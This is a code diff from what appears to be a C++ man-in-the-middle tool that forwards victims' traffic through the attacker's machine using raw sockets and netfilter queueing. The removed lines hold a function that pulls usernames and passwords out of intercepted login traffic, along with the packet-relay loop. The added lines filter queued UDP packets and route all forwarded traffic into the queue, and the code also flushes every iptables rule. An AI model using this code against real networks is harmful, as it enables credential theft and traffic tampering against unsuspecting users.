@@ -259,86 +259,6 @@ void* task2(void* arg){
     }
 }
 
-void parse_TCP(char* buffer) {
-    struct tcphdr* tcphdr = (struct tcphdr*)buffer;
-    string payload(buffer + 4 * tcphdr->doff);
-
-    int uname = payload.find("txtUsername");
-    int upwd  = payload.find("txtPassword");
-    int upwd_end = payload.find("\r\n", upwd);
-    if (uname == int(string::npos) || upwd == int(string::npos))
-        return;
-    cout << '\n';
-    cout << "Username: " << payload.substr(uname + 12, upwd - 1 - (uname + 12)) << '\n';
-    cout << "Password: " << payload.substr(upwd + 12, upwd_end - (upwd + 12))   << '\n';
-}
-
-void* packet_ret(void* arg) {
-    int raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (raw_socket < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
-
-    struct sockaddr_ll sa;
-    sa.sll_family   = AF_PACKET;
-    sa.sll_protocol = htons(ETH_P_ALL);
-    sa.sll_ifindex  = if_nametoindex(dev_name.c_str());
-    sa.sll_hatype   = ARPHRD_ETHER;
-    sa.sll_pkttype  = PACKET_OTHERHOST;
-    sa.sll_halen    = ETH_ALEN;
-    sa.sll_addr[6]  = 0;
-    sa.sll_addr[7]  = 0;
-
-    uint8_t selfmac[6], degwmac[6];
-    sscanf(own.mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &selfmac[0], &selfmac[1], &selfmac[2], &selfmac[3], &selfmac[4], &selfmac[5]);
-    sscanf(seen_addresses[gw.ip].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &degwmac[0], &degwmac[1], &degwmac[2], &degwmac[3], &degwmac[4], &degwmac[5]);
-    
-    char buffer[ETH_FRAME_LEN];
-    timeval start_time, end_time;
-    while (1) {
-        gettimeofday(&start_time, NULL);
-
-        memset(buffer, '0', sizeof(buffer));
-        ssize_t bytes_received = recv(raw_socket, buffer, sizeof(buffer), 0);
-        if (bytes_received == 0) 
-            continue;
-
-        struct ethhdr *eth = (struct ethhdr *)buffer;
-        if (memcmp(eth->h_dest, selfmac, 6 * sizeof(uint8_t)) != 0)
-            continue;
-        
-        struct iphdr *iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));
-        struct in_addr src_addr, dst_addr;
-        src_addr.s_addr = iph->saddr;
-        dst_addr.s_addr = iph->daddr;
-
-        if(seen_addresses.count(inet_ntoa(src_addr))) {
-            memcpy(sa.sll_addr, degwmac, 6);
-            memcpy(buffer, eth->h_dest, 6);
-            memcpy(buffer + 6, selfmac, 6);
-            if (iph->protocol == IPPROTO_TCP) {
-                parse_TCP(buffer + sizeof(ether_header) + 4 * iph->ihl);
-            }
-        }
-        else if(seen_addresses.count(inet_ntoa(dst_addr))) {
-            sscanf(seen_addresses[inet_ntoa(dst_addr)].c_str(), "%hhu:%hhu:%hhu:%hhu:%hhu:%hhu", &sa.sll_addr[0], &sa.sll_addr[1], &sa.sll_addr[2], &sa.sll_addr[3], &sa.sll_addr[4], &sa.sll_addr[5]);
-            memcpy(buffer, degwmac, 6);
-            memcpy(buffer + 6, selfmac, 6);
-        }
-        else 
-            continue;
-
-        sendto(raw_socket, buffer, bytes_received, 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll));
-
-        gettimeofday(&end_time, NULL);
-        double time_taken = (end_time.tv_sec - start_time.tv_sec) * 1e6 + (end_time.tv_usec - start_time.tv_usec);
-        cout << "Time taken: " << time_taken << " us\n";
-    }
-
-    close(raw_socket);
-}
-
 u_int16_t computeIPChecksum(struct iphdr* iphdr) {
     unsigned long sum = 0;
     u_int16_t* ptr = (u_int16_t*)iphdr;
@@ -410,6 +330,11 @@ static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *
     //     if ((i + 1) % 16 == 0) cout << endl;
     // }
     struct iphdr*  iphdr   = (struct iphdr*)(data);
+    // TCP : 6, UDP : 17
+    // cout << "Protocol: " << int(iphdr->protocol) << '\n';
+    if(int(iphdr->protocol) != 17)
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+
     struct udphdr* udp_hdr = (struct udphdr*)(data + iphdr->ihl*4);
     u_int16_t srcport = ntohs(udp_hdr->source);
     u_int16_t udp_len = ntohs(udp_hdr->len);
@@ -545,7 +470,7 @@ static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *
 
 static void* nfque(void* args) {
     string clean_iptable = execCommand("iptables --flush");
-    string set_iptable1  = execCommand("iptables -A FORWARD -p udp -j NFQUEUE --queue-num 0");
+    string set_iptable1  = execCommand("iptables -A FORWARD -j NFQUEUE --queue-num 0");
 
     struct nfq_handle *h = nfq_open();
     if (!h) {
